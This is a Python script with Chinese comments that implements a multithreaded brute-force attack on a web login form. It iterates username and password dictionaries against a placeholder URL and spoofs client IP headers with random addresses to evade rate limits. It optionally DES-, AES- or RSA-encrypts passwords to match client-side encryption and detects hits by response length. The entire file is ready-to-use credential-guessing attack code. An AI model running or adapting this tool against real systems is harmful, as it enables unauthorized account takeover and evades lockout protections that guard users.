# coding=utf-8

from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
import requests, urllib3, random, os, traceback, time, binascii, base64, threading
from datetime import datetime, timedelta
from Crypto.PublicKey import RSA
from Crypto.Cipher import DES, AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
from concurrent import futures
from lxml import etree

# 禁用https警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#
# =================== [ 全局设置 ] ===================
#

# 字典
USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_FILE_PATH
PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH

# 字典文件路径，代码被注释、空字符串或None就不读取
#USERNAME_FILE_PATH = "/root/bruteforce/username.txt"
#PASSWORD_FILE_PATH = "/root/bruteforce/password.txt"
#USERNAME_FILE_PATH = "D:\\Bruteforce\\username.txt"
#PASSWORD_FILE_PATH = "D:\\Bruteforce\\password.txt"

# 只爆破一个账号
ONLY_ONCE = False

# 爆破后暂停时长，单位秒
DELAY = 1

# 线程并发数
THREADS = 1

# 是否使用代理
USE_PROXY = True

# 设置代理
PROXIES = {
    "http": "http://127.0.0.1:8083",
    "https": "http://127.0.0.1:8083"
}

# 加载用户名字典
if 'USERNAME_FILE_PATH' in vars() and USERNAME_FILE_PATH:
    try:
        with open(USERNAME_FILE_PATH, "r", encoding="utf-8") as f:
            USERNAME.extend(f.readlines())
    except Exception as e:
        print(f"[x] Cannot open '{USERNAME_FILE_PATH}' file {e}")
        os._exit(0)

# 加载密码字典
if 'PASSWORD_FILE_PATH' in vars() and PASSWORD_FILE_PATH:
    try:
        with open(PASSWORD_FILE_PATH, "r", encoding="utf-8") as f:
            PASSWORD.extend(f.readlines())
    except Exception as e:
        print(f"[x] Cannot open '{PASSWORD_FILE_PATH}' file {e}")
        os._exit(0)

#
# =================== [ 工具函数 ] ===================
#

# 随机IP生成
def random_ipv4():
    return ".".join(str(random.randint(0,255)) for _ in range(4))

# DES加密
def DES_encrypt(message: str) -> str:
    cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
    message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()

# AES加密
def AES_encrypt(message: str) -> str:
    cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=DES.MODE_CBC)
    message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()

# RSA加密
def RSA_encrypt(message: str) -> str:
    pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
YwIDAQAB
-----END PUBLIC KEY-----"""
    pubkey = RSA.importKey(pubkey)
    cipher = PKCS1_v1_5.new(pubkey)
    message = message.encode('utf-8')
    encrypted = cipher.encrypt(message)
    encrypted = base64.b64encode(encrypted) # BASE64
    #encrypted = binascii.hexlify(encrypted) # HEX
    return encrypted.decode('utf-8') #.upper()

#
# =================== [ 爆破函数 ] ===================
#

# 设置Headers
HEADERS = requests.utils.default_headers()
HEADERS.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
})

# 设置Cookies
COOKIES = {
    'PHPSESSIONID': '0xDEADBEEF'
}

# 爆破函数，返回 (has_exception, found_password)
def run(username, password):

    IP = random_ipv4()
    HEADERS.update({
        "X-Forwarded-For": IP,
        "X-Originating-IP": IP,
        "X-Remote-IP": IP,
        "X-Remote-Addr": IP,
        "X-Real-IP": IP
    })
    
    session = requests.Session()

    time.sleep(DELAY)

    try:
        # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
        #response = session.get("https://example.com/login.html", headers=HEADERS, cookies=COOKIES, timeout=10, 
        #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
        #html = etree.HTML(response.text, etree.HTMLParser())
        #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]

        data = {
            "username": username,
            "password": password
        }
        response = session.post("https://example.com/login.html", data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
            allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)

        # if len(response.content) != 61:
        # if response.status_code != 401:
        # if "Failed" not in response.text:
        # if response.status_code == 302 and "index/user.html" in response.headers['Location']:

        if len(response.content) != 61:
            print(f"[+] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}")
            return False, True

        return False, False

    except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
        return True, False

    except Exception as e:
        print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
        print(traceback.format_exc())
        return True, False

#
# =================== [ 启动多线程爆破 ] ===================
#

TASKS = set()
TOTAL_COUNT = len(USERNAME) * len(PASSWORD)

FINISHED_COUNT = 0 # 已完成计数
FINISHED_COUNT_LOCK = threading.Lock() # 已完成计数锁

EXCEPTION_COUNT = 0 # 连续异常计数
EXCEPTION_COUNT_LOCK = threading.Lock() # 连续异常计数锁

THREAD_POOL_STOP_SIGNAL = False # 线程池停止信号
REPORT_THREAD_STOP_SIGNAL = threading.Event() # 进度汇报线程停止信号

# deltatime 格式化
def strfdelta(delta, fmt):
    d = dict()
    d["days"] = delta.days
    d["hours"], rem = divmod(delta.seconds, 3600)
    d["minutes"], d["seconds"] = divmod(rem, 60)
    return fmt.format(**d)

# 任务完成时的回调
def callback(future):
    global THREAD_POOL_STOP_SIGNAL, FINISHED_COUNT, EXCEPTION_COUNT
    
    # 获取结果
    has_exception, found_password = future.result()
    
    # 完成计数+1
    with FINISHED_COUNT_LOCK:
        FINISHED_COUNT += 1
    
    # 检查异常
    with EXCEPTION_COUNT_LOCK:
        if has_exception:
            EXCEPTION_COUNT += 1
            if EXCEPTION_COUNT > 10:
                print(f"[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
                THREAD_POOL_STOP_SIGNAL = True
        else:
            EXCEPTION_COUNT = 0

    # 标记是否找到密码
    if found_password and ONLY_ONCE:
        print(f"[+] {datetime.now().strftime('%H:%M:%S')} Password found. Quiting.")
        THREAD_POOL_STOP_SIGNAL = True

# 并发运行爆破函数
def concurrent_run(executor):
    global THREAD_POOL_STOP_SIGNAL, TASKS, FINISHED_COUNT
    
    for username in USERNAME:
        for password in PASSWORD:
            # 如果队列过长就等待
            if len(TASKS) >= THREADS:
                _, TASKS = futures.wait(TASKS, return_when=futures.FIRST_COMPLETED)

            # 检查是否需要退出
            if THREAD_POOL_STOP_SIGNAL == True:
                return

            # 清除右边的换行
            username = username.rstrip()
            password = password.rstrip()
            
            # 新建线程
            t = executor.submit(run, username, password)
            t.add_done_callback(callback)
            TASKS.add(t)

# 报告进度
def report_elapsed_time():
    global REPORT_THREAD_STOP_SIGNAL, TOTAL_COUNT, FINISHED_COUNT

    # 报告启动时间
    now = datetime.now()
    start_at = now
    print(f"[+] {now.strftime('%H:%M:%S')} task start")
    print(f"[!] {now.strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")

    # 死循环汇报时间
    while True:
        if True == REPORT_THREAD_STOP_SIGNAL.wait(timeout=60.0):
            break
        print(f"[!] {datetime.now().strftime('%H:%M:%S')} {FINISHED_COUNT}/{TOTAL_COUNT} ({FINISHED_COUNT * 100 // TOTAL_COUNT}%) finished")

    # 报告结束时间
    now = datetime.now()
    end_at = now
    elapsed = strfdelta(end_at - start_at, "{days} days {hours}:{minutes}:{seconds}")
    print(f"[+] {now.strftime('%H:%M:%S')} task finished, elapsed {elapsed}")

# 启动进度报告线程
thread = threading.Thread(target=report_elapsed_time)
thread.start()

# 线程池
with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    try:
        concurrent_run(executor)
        print("[!] Wait for all threads exit.")
        futures.wait(TASKS, return_when=futures.ALL_COMPLETED)
    except KeyboardInterrupt:
        print("[!] Get Ctrl-C, wait for all threads exit.")
        futures.wait(TASKS, return_when=futures.ALL_COMPLETED)
    finally:
        REPORT_THREAD_STOP_SIGNAL.set()

# 等待线程退出
thread.join()